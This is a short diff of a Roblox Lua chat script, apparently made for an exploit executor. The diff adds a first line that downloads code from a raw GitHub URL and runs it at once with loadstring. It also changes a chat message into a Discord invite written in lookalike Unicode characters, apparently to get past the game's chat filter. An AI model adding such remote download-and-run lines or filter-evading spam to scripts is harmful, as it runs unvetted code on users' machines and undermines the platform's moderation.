@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vqmpjayZ/More-Scripts/refs/heads/main/Anthony's%20ACL"))()
 local replicatedStorage = game:GetService("ReplicatedStorage")
 local textChatService = game:GetService("TextChatService")
 local oldChat = false
@@ -19,4 +20,4 @@ local function Chat(msg)
 end
 
 -- Example usage with modified message
-Chat("AK ADMIN | Join Server Code: /akadmin")
+Chat("AK ADMIN | Join ḍ̲ị̲ṣ̲с̲ọ̲ṛ̲ḍ̲ Server: ḍ̲ị̲ṣ̲с̲ọ̲ṛ̲ḍ̲.ɡ̲ɡ̲/ḅ̲ɡ̲Ẉ̲Ỵ̲2ẓ̲Ẹ̲Ṿ̲7ẓ̲")
